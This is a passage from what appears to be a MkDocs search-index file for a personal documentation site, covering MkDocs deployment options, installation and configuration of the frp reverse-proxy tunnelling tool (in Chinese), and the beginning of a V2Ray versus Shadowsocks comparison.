web interface to set up the custom domain (under Settings / Custom Domain). If you use the web interface, GitHub will create the CNAME file for you and save it to the root of your \"pages\" branch. So that the file does not get removed the next time you deploy, you need to copy the file to your docs_dir . With the file properly included in your docs_dir , MkDocs will include the file in your built site and push it to your \"pages\" branch each time you run the gh-deploy command. If you are having problems getting a custom domain to work, see GitHub's documentation on Troubleshooting custom domains .","title":"Custom Domains"},{"location":"python/mkdocs/#other-providers","text":"Any hosting provider which can serve static files can be used to serve documentation generated by MkDocs. While it would be impossible to document how to upload the docs to every hosting provider out there, the following guidelines should provide some general assistance. When you build your site (using the mkdocs build command), all of the files are written to the directory assigned to the site_dir configuration option (defaults to \"site\" ) in your mkdocs.yaml config file. Generally, you will simply need to copy the contents of that directory to the root directory of your hosting provider's server. Depending on your hosting provider's setup, you may need to use a graphical or command line ftp , ssh or scp client to transfer the files. For example, a typical set of commands from the command line might look something like this: mkdocs build scp -r ./site user@host:/path/to/server/root Of course, you will need to replace user with the username you have with your hosting provider and host with the appropriate domain name. Additionally, you will need to adjust the /path/to/server/root to match the configuration of your hosts' file system. See your host's documentation for specifics. You will likely want to search their documentation for \"ftp\" or \"uploading site\".","title":"Other Providers"},{"location":"python/mkdocs/#local-files","text":"Rather than hosting your documentation on a server, you may instead distribute the files directly, which can then be viewed in a browser using the file:// scheme. Note that, due to the security settings of all modern browsers, some things will not work the same and some features may not work at all. In fact, a few settings will need to be customized in very specific ways. site_url : The site_url must be set to an empty string, which instructs MkDocs to build your site so that it will work with the file:// scheme. site_url: \"\" use_directory_urls : Set use_directory_urls to false . Otherwise, internal links between pages will not work properly. use_directory_urls: false search : You will need to either disable the search plugin, or use a third-party search plugin which is specifically designed to work with the file:// scheme. To disable all plugins, set the plugins setting to an empty list. plugins: [] If you have other plugins enabled, simply ensure that search is not included in the list. When writing your documentation, it is imperative that all internal links use relative URLs as documented . Remember, each reader of your documentation will be using a different device and the files will likely be in a different location on that device. If you expect your documentation to be viewed off-line, you may also need to be careful about which themes you choose. Many themes make use of CDNs for various support files, which require a live Internet connection. You will need to choose a theme which includes all support files directly in the theme. When you build your site (using the mkdocs build command), all of the files are written to the directory assigned to the site_dir configuration option (defaults to \"site\" ) in your mkdocs.yaml config file. Generally, you will simply need to copy the contents of that directory and distribute it to your readers. Alternatively, you may choose to use a third party tool to convert the HTML files to some other documentation format.","title":"Local Files"},{"location":"python/mkdocs/#404-pages","text":"When MkDocs builds the documentation it will include a 404.html file in the build directory . This file will be automatically used when deploying to GitHub but only on a custom domain. Other web servers may be configured to use it but the feature won't always be available. See the documentation for your server of choice for more information.","title":"404 Pages"},{"location":"tool/frp/","text":"Frp \uf0c1 \u7b80\u5355\u3001\u9ad8\u6548\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177 \u4ecb\u7ecd \uf0c1 frp \u662f\u4e00\u4e2a\u4e13\u6ce8\u4e8e\u5185\u7f51\u7a7f\u900f\u7684\u9ad8\u6027\u80fd\u7684\u53cd\u5411\u4ee3\u7406\u5e94\u7528\uff0c\u652f\u6301 TCP\u3001UDP\u3001HTTP\u3001HTTPS \u7b49\u591a\u79cd\u534f\u8bae\u3002\u53ef\u4ee5\u5c06\u5185\u7f51\u670d\u52a1\u4ee5\u5b89\u5168\u3001\u4fbf\u6377\u7684\u65b9\u5f0f\u901a\u8fc7\u5177\u6709\u516c\u7f51 IP \u8282\u70b9\u7684\u4e2d\u8f6c\u66b4\u9732\u5230\u516c\u7f51\u3002 \u529f\u80fd\u7279\u6027 \uf0c1 \u901a\u8fc7\u5728\u5177\u6709\u516c\u7f51 IP \u7684\u8282\u70b9\u4e0a\u90e8\u7f72 frp \u670d\u52a1\u7aef\uff0c\u53ef\u4ee5\u8f7b\u677e\u5730\u5c06\u5185\u7f51\u670d\u52a1\u7a7f\u900f\u5230\u516c\u7f51\uff0c\u540c\u65f6\u63d0\u4f9b\u8bf8\u591a\u4e13\u4e1a\u7684\u529f\u80fd\u7279\u6027\uff0c\u8fd9\u5305\u62ec\uff1a \u5ba2\u6237\u7aef\u670d\u52a1\u7aef\u901a\u4fe1\u652f\u6301 TCP\u3001KCP \u4ee5\u53ca Websocket \u7b49\u591a\u79cd\u534f\u8bae\u3002 \u91c7\u7528 TCP \u8fde\u63a5\u6d41\u5f0f\u590d\u7528\uff0c\u5728\u5355\u4e2a\u8fde\u63a5\u95f4\u627f\u8f7d\u66f4\u591a\u8bf7\u6c42\uff0c\u8282\u7701\u8fde\u63a5\u5efa\u7acb\u65f6\u95f4\u3002 \u4ee3\u7406\u7ec4\u95f4\u7684\u8d1f\u8f7d\u5747\u8861\u3002 \u7aef\u53e3\u590d\u7528\uff0c\u591a\u4e2a\u670d\u52a1\u901a\u8fc7\u540c\u4e00\u4e2a\u670d\u52a1\u7aef\u7aef\u53e3\u66b4\u9732\u3002 \u591a\u4e2a\u539f\u751f\u652f\u6301\u7684\u5ba2\u6237\u7aef\u63d2\u4ef6\uff08\u9759\u6001\u6587\u4ef6\u67e5\u770b\uff0cHTTP\u3001SOCK5 \u4ee3\u7406\u7b49\uff09\uff0c\u4fbf\u4e8e\u72ec\u7acb\u4f7f\u7528 frp \u5ba2\u6237\u7aef\u5b8c\u6210\u67d0\u4e9b\u5de5\u4f5c\u3002 \u9ad8\u5ea6\u6269\u5c55\u6027\u7684\u670d\u52a1\u7aef\u63d2\u4ef6\u7cfb\u7edf\uff0c\u65b9\u4fbf\u7ed3\u5408\u81ea\u8eab\u9700\u6c42\u8fdb\u884c\u529f\u80fd\u6269\u5c55\u3002 \u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef UI \u9875\u9762\u3002 \u5b89\u88c5 \uf0c1 \u6839\u636e\u64cd\u4f5c\u7cfb\u7edf\u548c\u67b6\u6784\uff0c\u4ece Github \u7684 Release \u9875\u9762\u4e0b\u8f7d\u6700\u65b0\u7684\u7a0b\u5e8f\u3002 \u89e3\u538b\u7f29\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\uff0c\u5c06\u5176\u4e2d\u7684 frpc \u62f7\u8d1d\u5230\u5185\u7f51\u670d\u52a1\u6240\u5728\u7684\u673a\u5668\u4e0a\uff0c\u5c06 frps \u62f7\u8d1d\u5230\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u4e0a\uff0c\u653e\u7f6e\u5728\u4efb\u610f\u76ee\u5f55\u3002 $ wget https://github.com/fatedier/frp/releases/download/v0.43.0/frp_0.43.0_linux_amd64.tar.gz $ tar -xzvf frp_0.43.0_linux_amd64.tar.gz $ sudo mv frp_0.43.0_linux_amd64/frps /usr/local/bin/ $ sudo mv frp_0.43.0_linux_amd64/frpc /usr/local/bin/ $ sudo mkdir /etc/frps $ sudo mv frp_0.43.0_linux_amd64/frps.ini /etc/frps/ $ sudo mv frp_0.43.0_linux_amd64/frps_full.ini /etc/frps/ $ /usr/local/bin/frps -c /etc/frps/frps.ini \u6587\u4ef6\u6db5\u4e49 . \u251c\u2500\u2500 frpc \u5ba2\u6237\u7aef\u7a0b\u5e8f \u251c\u2500\u2500 frpc_full.ini \u5ba2\u6237\u7aef\u5b8c\u6574\u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 frpc.ini \u5ba2\u6237\u7aef\u7b80\u6613\u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 frps \u670d\u52a1\u7aef\u7a0b\u5e8f \u251c\u2500\u2500 frps_full.ini \u670d\u52a1\u7aef\u5b8c\u6574\u914d\u7f6e\u6587\u4ef6 \u2514\u2500\u2500 frps.ini \u670d\u52a1\u7aef\u7b80\u6613\u914d\u7f6e\u6587\u4ef6 frp \u91c7\u7528 Golang \u7f16\u5199\uff0c\u652f\u6301\u8de8\u5e73\u53f0\uff0c\u4ec5\u9700\u4e0b\u8f7d\u5bf9\u5e94\u5e73\u53f0\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5373\u53ef\u6267\u884c\uff0c\u6ca1\u6709\u989d\u5916\u4f9d\u8d56\u3002 \u5f00\u59cb\u4f7f\u7528 \uf0c1 \u7f16\u5199\u914d\u7f6e\u6587\u4ef6\uff0c\u5148\u901a\u8fc7 ./frps -c ./frps.ini \u542f\u52a8\u670d\u52a1\u7aef\uff0c\u518d\u901a\u8fc7 ./frpc -c ./frpc.ini \u542f\u52a8\u5ba2\u6237\u7aef\u3002\u5982\u679c\u9700\u8981\u5728\u540e\u53f0\u957f\u671f\u8fd0\u884c\uff0c\u5efa\u8bae\u7ed3\u5408\u5176\u4ed6\u5de5\u5177\u4f7f\u7528\uff0c\u4f8b\u5982 systemd \u548c supervisor \u3002 \u5982\u679c\u662f Windows \u7528\u6237\uff0c\u9700\u8981\u5728 cmd \u7ec8\u7aef\u4e2d\u6267\u884c\u547d\u4ee4\u3002 \u914d\u7f6e\u6587\u4ef6\u5982\u4f55\u7f16\u5199\u53ef\u4ee5\u53c2\u8003 \u793a\u4f8b \u4e2d\u7684\u5185\u5bb9\u3002 systemd \uf0c1 $ vim /etc/systemd/system/frps.service [Unit] # \u670d\u52a1\u540d\u79f0\uff0c\u53ef\u81ea\u5b9a\u4e49 Description=frp server After=network.target syslog.target Wants=network.target [Service] Type=simple # \u542f\u52a8frps\u7684\u547d\u4ee4\uff0c\u9700\u4fee\u6539\u4e3a\u60a8\u7684frps\u7684\u5b89\u88c5\u8def\u5f84 ExecStart=/path/to/frps -c /path/to/frps.ini [Install] WantedBy=multi-user.target $ systemctl enable frps $ systemctl start frps $ systemctl status frps windows\u5f00\u673a\u542f\u52a8 \uf0c1 \u6253\u5f00\u6ce8\u518c\u8868\uff0c\u5728 \u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u4e0b\u6dfb\u52a0\u5b57\u7b26\u4e32\u503c \u8ba1\u7b97\u673a\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u540d\u79f0: Frpc \u7c7b\u578b: REG_SZ \u6570\u636e: \"D:\\Program Files\\frp_0.43.0_windows_amd64\\frpc.exe\" -c \"D:\\Program Files\\frp_0.43.0_windows_amd64\\frpc.ini\" \u901a\u8fc7 SSH \u8bbf\u95ee\u5c40\u57df\u7f51\u4e2d\u7684\u8ba1\u7b97\u673a \uf0c1 \u8fd9\u4e2a\u793a\u4f8b\u901a\u8fc7\u7b80\u5355\u914d\u7f6e TCP \u7c7b\u578b\u7684\u4ee3\u7406\u8ba9\u7528\u6237\u8bbf\u95ee\u5230\u5185\u7f51\u7684\u670d\u52a1\u5668\u3002 \u5728\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u4e0a\u90e8\u7f72 frps\uff0c\u4fee\u6539 frps.ini \u6587\u4ef6\uff0c\u8fd9\u91cc\u4f7f\u7528\u4e86\u6700\u7b80\u5316\u7684\u914d\u7f6e\uff0c\u8bbe\u7f6e\u4e86 frp \u670d\u52a1\u5668\u7528\u6237\u63a5\u6536\u5ba2\u6237\u7aef\u8fde\u63a5\u7684\u7aef\u53e3\uff1a [common] bind_port = 7000 \u5728\u9700\u8981\u88ab\u8bbf\u95ee\u7684\u5185\u7f51\u673a\u5668\u4e0a\uff08SSH \u670d\u52a1\u901a\u5e38\u76d1\u542c\u5728 22 \u7aef\u53e3\uff09\u90e8\u7f72 frpc\uff0c\u4fee\u6539 frpc.ini \u6587\u4ef6\uff0c\u5047\u8bbe frps \u6240\u5728\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u4e3a x.x.x.x\uff1a [common] server_addr = x.x.x.x server_port = 7000 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 local_ip \u548c local_port \u914d\u7f6e\u4e3a\u672c\u5730\u9700\u8981\u66b4\u9732\u5230\u516c\u7f51\u7684\u670d\u52a1\u5730\u5740\u548c\u7aef\u53e3\u3002 remote_port \u8868\u793a\u5728 frp \u670d\u52a1\u7aef\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u8bbf\u95ee\u6b64\u7aef\u53e3\u7684\u6d41\u91cf\u5c06\u4f1a\u88ab\u8f6c\u53d1\u5230\u672c\u5730\u670d\u52a1\u5bf9\u5e94\u7684\u7aef\u53e3\u3002 \u5206\u522b\u542f\u52a8 frps \u548c frpc\u3002 \u901a\u8fc7 SSH \u8bbf\u95ee\u5185\u7f51\u673a\u5668\uff0c\u5047\u8bbe\u7528\u6237\u540d\u4e3a test\uff1a ssh -oPort=6000 test@x.x.x.x frp \u4f1a\u5c06\u8bf7\u6c42 x.x.x.x:6000 \u7684\u6d41\u91cf\u8f6c\u53d1\u5230\u5185\u7f51\u673a\u5668\u7684 22 \u7aef\u53e3\u3002 \u53c2\u8003\u8d44\u6599 \uf0c1 \u6587\u6863: https://gofrp.org/ \u6e90\u4ee3\u7801: https://github.com/fatedier/frp","title":"Frp"},{"location":"tool/frp/#frp","text":"\u7b80\u5355\u3001\u9ad8\u6548\u7684\u5185\u7f51\u7a7f\u900f\u5de5\u5177","title":"Frp"},{"location":"tool/frp/#introduction","text":"frp \u662f\u4e00\u4e2a\u4e13\u6ce8\u4e8e\u5185\u7f51\u7a7f\u900f\u7684\u9ad8\u6027\u80fd\u7684\u53cd\u5411\u4ee3\u7406\u5e94\u7528\uff0c\u652f\u6301 TCP\u3001UDP\u3001HTTP\u3001HTTPS \u7b49\u591a\u79cd\u534f\u8bae\u3002\u53ef\u4ee5\u5c06\u5185\u7f51\u670d\u52a1\u4ee5\u5b89\u5168\u3001\u4fbf\u6377\u7684\u65b9\u5f0f\u901a\u8fc7\u5177\u6709\u516c\u7f51 IP \u8282\u70b9\u7684\u4e2d\u8f6c\u66b4\u9732\u5230\u516c\u7f51\u3002","title":"\u4ecb\u7ecd"},{"location":"tool/frp/#features","text":"\u901a\u8fc7\u5728\u5177\u6709\u516c\u7f51 IP \u7684\u8282\u70b9\u4e0a\u90e8\u7f72 frp \u670d\u52a1\u7aef\uff0c\u53ef\u4ee5\u8f7b\u677e\u5730\u5c06\u5185\u7f51\u670d\u52a1\u7a7f\u900f\u5230\u516c\u7f51\uff0c\u540c\u65f6\u63d0\u4f9b\u8bf8\u591a\u4e13\u4e1a\u7684\u529f\u80fd\u7279\u6027\uff0c\u8fd9\u5305\u62ec\uff1a \u5ba2\u6237\u7aef\u670d\u52a1\u7aef\u901a\u4fe1\u652f\u6301 TCP\u3001KCP \u4ee5\u53ca Websocket \u7b49\u591a\u79cd\u534f\u8bae\u3002 \u91c7\u7528 TCP \u8fde\u63a5\u6d41\u5f0f\u590d\u7528\uff0c\u5728\u5355\u4e2a\u8fde\u63a5\u95f4\u627f\u8f7d\u66f4\u591a\u8bf7\u6c42\uff0c\u8282\u7701\u8fde\u63a5\u5efa\u7acb\u65f6\u95f4\u3002 \u4ee3\u7406\u7ec4\u95f4\u7684\u8d1f\u8f7d\u5747\u8861\u3002 \u7aef\u53e3\u590d\u7528\uff0c\u591a\u4e2a\u670d\u52a1\u901a\u8fc7\u540c\u4e00\u4e2a\u670d\u52a1\u7aef\u7aef\u53e3\u66b4\u9732\u3002 \u591a\u4e2a\u539f\u751f\u652f\u6301\u7684\u5ba2\u6237\u7aef\u63d2\u4ef6\uff08\u9759\u6001\u6587\u4ef6\u67e5\u770b\uff0cHTTP\u3001SOCK5 \u4ee3\u7406\u7b49\uff09\uff0c\u4fbf\u4e8e\u72ec\u7acb\u4f7f\u7528 frp \u5ba2\u6237\u7aef\u5b8c\u6210\u67d0\u4e9b\u5de5\u4f5c\u3002 \u9ad8\u5ea6\u6269\u5c55\u6027\u7684\u670d\u52a1\u7aef\u63d2\u4ef6\u7cfb\u7edf\uff0c\u65b9\u4fbf\u7ed3\u5408\u81ea\u8eab\u9700\u6c42\u8fdb\u884c\u529f\u80fd\u6269\u5c55\u3002 \u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef UI \u9875\u9762\u3002","title":"\u529f\u80fd\u7279\u6027"},{"location":"tool/frp/#install","text":"\u6839\u636e\u64cd\u4f5c\u7cfb\u7edf\u548c\u67b6\u6784\uff0c\u4ece Github \u7684 Release \u9875\u9762\u4e0b\u8f7d\u6700\u65b0\u7684\u7a0b\u5e8f\u3002 \u89e3\u538b\u7f29\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\uff0c\u5c06\u5176\u4e2d\u7684 frpc \u62f7\u8d1d\u5230\u5185\u7f51\u670d\u52a1\u6240\u5728\u7684\u673a\u5668\u4e0a\uff0c\u5c06 frps \u62f7\u8d1d\u5230\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u4e0a\uff0c\u653e\u7f6e\u5728\u4efb\u610f\u76ee\u5f55\u3002 $ wget https://github.com/fatedier/frp/releases/download/v0.43.0/frp_0.43.0_linux_amd64.tar.gz $ tar -xzvf frp_0.43.0_linux_amd64.tar.gz $ sudo mv frp_0.43.0_linux_amd64/frps /usr/local/bin/ $ sudo mv frp_0.43.0_linux_amd64/frpc /usr/local/bin/ $ sudo mkdir /etc/frps $ sudo mv frp_0.43.0_linux_amd64/frps.ini /etc/frps/ $ sudo mv frp_0.43.0_linux_amd64/frps_full.ini /etc/frps/ $ /usr/local/bin/frps -c /etc/frps/frps.ini \u6587\u4ef6\u6db5\u4e49 . \u251c\u2500\u2500 frpc \u5ba2\u6237\u7aef\u7a0b\u5e8f \u251c\u2500\u2500 frpc_full.ini \u5ba2\u6237\u7aef\u5b8c\u6574\u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 frpc.ini \u5ba2\u6237\u7aef\u7b80\u6613\u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 frps \u670d\u52a1\u7aef\u7a0b\u5e8f \u251c\u2500\u2500 frps_full.ini \u670d\u52a1\u7aef\u5b8c\u6574\u914d\u7f6e\u6587\u4ef6 \u2514\u2500\u2500 frps.ini \u670d\u52a1\u7aef\u7b80\u6613\u914d\u7f6e\u6587\u4ef6 frp \u91c7\u7528 Golang \u7f16\u5199\uff0c\u652f\u6301\u8de8\u5e73\u53f0\uff0c\u4ec5\u9700\u4e0b\u8f7d\u5bf9\u5e94\u5e73\u53f0\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5373\u53ef\u6267\u884c\uff0c\u6ca1\u6709\u989d\u5916\u4f9d\u8d56\u3002","title":"\u5b89\u88c5"},{"location":"tool/frp/#start","text":"\u7f16\u5199\u914d\u7f6e\u6587\u4ef6\uff0c\u5148\u901a\u8fc7 ./frps -c ./frps.ini \u542f\u52a8\u670d\u52a1\u7aef\uff0c\u518d\u901a\u8fc7 ./frpc -c ./frpc.ini \u542f\u52a8\u5ba2\u6237\u7aef\u3002\u5982\u679c\u9700\u8981\u5728\u540e\u53f0\u957f\u671f\u8fd0\u884c\uff0c\u5efa\u8bae\u7ed3\u5408\u5176\u4ed6\u5de5\u5177\u4f7f\u7528\uff0c\u4f8b\u5982 systemd \u548c supervisor \u3002 \u5982\u679c\u662f Windows \u7528\u6237\uff0c\u9700\u8981\u5728 cmd \u7ec8\u7aef\u4e2d\u6267\u884c\u547d\u4ee4\u3002 \u914d\u7f6e\u6587\u4ef6\u5982\u4f55\u7f16\u5199\u53ef\u4ee5\u53c2\u8003 \u793a\u4f8b \u4e2d\u7684\u5185\u5bb9\u3002","title":"\u5f00\u59cb\u4f7f\u7528"},{"location":"tool/frp/#systemd","text":"$ vim /etc/systemd/system/frps.service [Unit] # \u670d\u52a1\u540d\u79f0\uff0c\u53ef\u81ea\u5b9a\u4e49 Description=frp server After=network.target syslog.target Wants=network.target [Service] Type=simple # \u542f\u52a8frps\u7684\u547d\u4ee4\uff0c\u9700\u4fee\u6539\u4e3a\u60a8\u7684frps\u7684\u5b89\u88c5\u8def\u5f84 ExecStart=/path/to/frps -c /path/to/frps.ini [Install] WantedBy=multi-user.target $ systemctl enable frps $ systemctl start frps $ systemctl status frps","title":"systemd"},{"location":"tool/frp/#windows-auto-run","text":"\u6253\u5f00\u6ce8\u518c\u8868\uff0c\u5728 \u8ba1\u7b97\u673a\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u4e0b\u6dfb\u52a0\u5b57\u7b26\u4e32\u503c \u8ba1\u7b97\u673a\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \u540d\u79f0: Frpc \u7c7b\u578b: REG_SZ \u6570\u636e: \"D:\\Program Files\\frp_0.43.0_windows_amd64\\frpc.exe\" -c \"D:\\Program Files\\frp_0.43.0_windows_amd64\\frpc.ini\"","title":"windows\u5f00\u673a\u542f\u52a8"},{"location":"tool/frp/#ssh-example","text":"\u8fd9\u4e2a\u793a\u4f8b\u901a\u8fc7\u7b80\u5355\u914d\u7f6e TCP \u7c7b\u578b\u7684\u4ee3\u7406\u8ba9\u7528\u6237\u8bbf\u95ee\u5230\u5185\u7f51\u7684\u670d\u52a1\u5668\u3002 \u5728\u5177\u6709\u516c\u7f51 IP \u7684\u673a\u5668\u4e0a\u90e8\u7f72 frps\uff0c\u4fee\u6539 frps.ini \u6587\u4ef6\uff0c\u8fd9\u91cc\u4f7f\u7528\u4e86\u6700\u7b80\u5316\u7684\u914d\u7f6e\uff0c\u8bbe\u7f6e\u4e86 frp \u670d\u52a1\u5668\u7528\u6237\u63a5\u6536\u5ba2\u6237\u7aef\u8fde\u63a5\u7684\u7aef\u53e3\uff1a [common] bind_port = 7000 \u5728\u9700\u8981\u88ab\u8bbf\u95ee\u7684\u5185\u7f51\u673a\u5668\u4e0a\uff08SSH \u670d\u52a1\u901a\u5e38\u76d1\u542c\u5728 22 \u7aef\u53e3\uff09\u90e8\u7f72 frpc\uff0c\u4fee\u6539 frpc.ini \u6587\u4ef6\uff0c\u5047\u8bbe frps \u6240\u5728\u670d\u52a1\u5668\u7684\u516c\u7f51 IP \u4e3a x.x.x.x\uff1a [common] server_addr = x.x.x.x server_port = 7000 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 local_ip \u548c local_port \u914d\u7f6e\u4e3a\u672c\u5730\u9700\u8981\u66b4\u9732\u5230\u516c\u7f51\u7684\u670d\u52a1\u5730\u5740\u548c\u7aef\u53e3\u3002 remote_port \u8868\u793a\u5728 frp \u670d\u52a1\u7aef\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u8bbf\u95ee\u6b64\u7aef\u53e3\u7684\u6d41\u91cf\u5c06\u4f1a\u88ab\u8f6c\u53d1\u5230\u672c\u5730\u670d\u52a1\u5bf9\u5e94\u7684\u7aef\u53e3\u3002 \u5206\u522b\u542f\u52a8 frps \u548c frpc\u3002 \u901a\u8fc7 SSH \u8bbf\u95ee\u5185\u7f51\u673a\u5668\uff0c\u5047\u8bbe\u7528\u6237\u540d\u4e3a test\uff1a ssh -oPort=6000 test@x.x.x.x frp \u4f1a\u5c06\u8bf7\u6c42 x.x.x.x:6000 \u7684\u6d41\u91cf\u8f6c\u53d1\u5230\u5185\u7f51\u673a\u5668\u7684 22 \u7aef\u53e3\u3002","title":"\u901a\u8fc7 SSH \u8bbf\u95ee\u5c40\u57df\u7f51\u4e2d\u7684\u8ba1\u7b97\u673a"},{"location":"tool/frp/#references","text":"\u6587\u6863: https://gofrp.org/ \u6e90\u4ee3\u7801: https://github.com/fatedier/frp","title":"\u53c2\u8003\u8d44\u6599"},{"location":"tool/v2ray/","text":"v2ray \uf0c1 A platform for building proxies to bypass network restrictions. \u7b80\u4ecb \uf0c1 V2Ray \u662f Project V \u4e0b\u7684\u4e00\u4e2a\u5de5\u5177\u3002Project V \u662f\u4e00\u4e2a\u5305\u542b\u4e00\u7cfb\u5217\u6784\u5efa\u7279\u5b9a\u7f51\u7edc\u73af\u5883\u5de5\u5177\u7684\u9879\u76ee\uff0c\u800c V2Ray \u5c5e\u4e8e\u6700\u6838\u5fc3\u7684\u4e00\u4e2a\u3002 \u5b98\u65b9\u4e2d\u4ecb\u7ecd Project V \u63d0\u4f9b\u4e86\u5355\u4e00\u7684\u5185\u6838\u548c\u591a\u79cd\u754c\u9762\u64cd\u4f5c\u65b9\u5f0f\u3002\u5185\u6838\uff08V2Ray\uff09\u7528\u4e8e\u5b9e\u9645\u7684\u7f51\u7edc\u4ea4\u4e92\u3001\u8def\u7531\u7b49\u9488\u5bf9\u7f51\u7edc\u6570\u636e\u7684\u5904\u7406\uff0c\u800c\u5916\u56f4\u7684\u7528\u6237\u754c\u9762\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u65b9\u4fbf\u76f4\u63a5\u7684\u64cd\u4f5c\u6d41\u7a0b \u3002\u4e0d\u8fc7\u4ece\u65f6\u95f4\u4e0a\u6765\u8bf4\uff0c\u5148\u6709 V2Ray \u624d\u6709 Project V\u3002 \u5982\u679c\u8fd8\u662f\u4e0d\u7406\u89e3\uff0c\u90a3\u4e48\u7b80\u5355\u5730\u8bf4\uff0cV2Ray \u662f\u4e00\u4e2a\u4e0e Shadowsocks \u7c7b\u4f3c\u7684\u4ee3\u7406\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7528\u6765\u79d1\u5b66\u4e0a\u7f51\uff08\u7ffb\u5899\uff09\u5b66\u4e60\u56fd\u5916\u5148\u8fdb\u79d1\u5b66\u6280\u672f\u3002 V2Ray \u7528\u6237\u624b\u518c: https://www.v2fly.org/ V2Ray \u9879\u76ee\u5730\u5740: https://github.com/v2fly/v2ray-core \u672a\u8fc1\u79fb\u524d\u7684\u5730\u5740: https://github.com/v2ray/v2ray-core V2Ray \u914d\u7f6e\u6307\u5357: https://github.com/ToutyRater/v2ray-guide V2Ray \u8ddf Shadowsocks \u6709\u4ec0\u4e48\u533a\u522b \uf0c1 Shadowsocks \u662f\u4e00\u4e2a\u7eaf\u7cb9\u7684\u4ee3\u7406\u5de5\u5177\uff0c\u800c V2Ray \u5b9a\u4f4d\u4e3a\u4e00\u4e2a\u5e73\u53f0\uff0c\u4efb\u4f55\u5f00\u53d1\u8005\u90fd\u53ef\u4ee5\u5229\u7528 V2Ray \u63d0\u4f9b\u7684\u6a21\u5757\u5f00\u53d1\u51fa\u65b0\u7684\u4ee3\u7406\u8f6f\u4ef6\u3002 \u4e86\u89e3 Shadowsocks \u5386\u53f2\u7684\u540c\u5b66\u90fd\u77e5\u9053\uff0cShadowsocks \u662f clowwindy \u5f00\u53d1\u7684\u81ea\u7528\u7684\u8f6f\u4ef6\uff0c\u5f00\u53d1\u7684\u521d\u8877\u53ea\u662f\u4e3a\u4e86\u8ba9\u81ea\u5df1\u80fd\u591f\u7b80\u5355\u9ad8\u6548\u5730\u79d1\u5b66\u4e0a\u7f51\uff0c\u81ea\u5df1\u4f7f\u7528\u4e86\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u540e\u89c9\u5f97\u4e0d\u9519\u624d\u5171\u4eab\u51fa\u6765\u7684\u3002V2Ray \u662f clowwindy \u88ab\u559d\u8336\u4e4b\u540e V2Ray \u9879\u76ee\u7ec4\u4e3a\u8868\u793a\u6297\u8bae\u5f00\u53d1\u7684\uff0c\u4e00\u5f00\u59cb\u5c31\u81f4\u529b\u4e8e\u8ba9\u5927\u5bb6\u66f4\u597d\u66f4\u5feb\u7684\u79d1\u5b66\u4e0a\u7f51\u3002 \u7531\u4e8e\u51fa\u751f\u65f6\u7684\u5386\u53f2\u80cc\u666f\u4e0d\u540c\uff0c\u5bfc\u81f4\u4e86\u5b83\u4eec\u6027\u683c\u7279\u70b9\u7684\u5dee\u5f02\u3002 \u7b80\u5355\u6765\u8bf4\uff0cShadowsocks \u529f\u80fd\u5355\u4e00\uff0cV2Ray \u529f\u80fd\u5f3a\u5927\u3002\u542c\u8d77\u6765\u4f3c\u4e4e\u6709\u70b9\u8d2c\u4f4e Shadowsocks \u5462\uff1f\u5f53\u7136\u4e0d\uff01\u6362\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0cShadowsocks \u7b80\u5355\u597d\u4e0a\u624b\uff0cV2Ray \u590d\u6742\u914d\u7f6e\u591a\u3002 \u7531\u4e8e\u8bb8\u591a V2Ray \u7528\u6237\u90fd\u6709\u4f7f\u7528\u8fc7 Shadowsocks \u7684\u7ecf\u9a8c\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u6309\u7167\u4f7f\u7528 Shadowsocks \u90a3\u6837\u4f7f\u7528\u3002\u4f46\u662f V2Ray \u8fd8\u662f\u548c Shadowsocks \u4e0d\u592a\u4e00\u6837\uff0c\u6240\u4ee5\u6211\u5927\u6982\u8bf4\u4e00\u4e0b\u4f7f\u7528\u4e0a\u7684\u5dee\u5f02\u3002\u8bf7\u6ce8\u610f\uff0c\u5dee\u5f02\u4e0d\u4ee3\u8868\u597d\u574f\u6216\u4f18\u52a3\uff0c\u5982\u679c\u4e00\u4e2a\u4e8b\u7269\u5fc5\u987b\u62e5\u6709\u5176\u4ed6\u540c\u7c7b\u6240\u62e5\u6709\u7684\u4e1c\u897f\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u6ca1\u6709\u4e86\u5b58\u5728\u7684\u610f\u4e49\u3002 \u5ba2\u6237\u7aef\uff1aV2Ray \u672c\u8eab\u53ea\u662f\u4e00\u4e2a\u5185\u6838\uff0cV2Ray \u4e0a\u7684\u56fe\u5f62\u5ba2\u6237\u7aef\u5927\u591a\u662f\u8c03\u7528 V2Ray \u5185\u6838\u5957\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\u7684\u5916\u58f3\uff0c\u7c7b\u4f3c\u4e8e Linux \u5185\u6838\u548c Linux \u64cd\u4f5c\u7cfb\u7edf\u7684\u5173\u7cfb\uff1b\u800c Shadowsocks 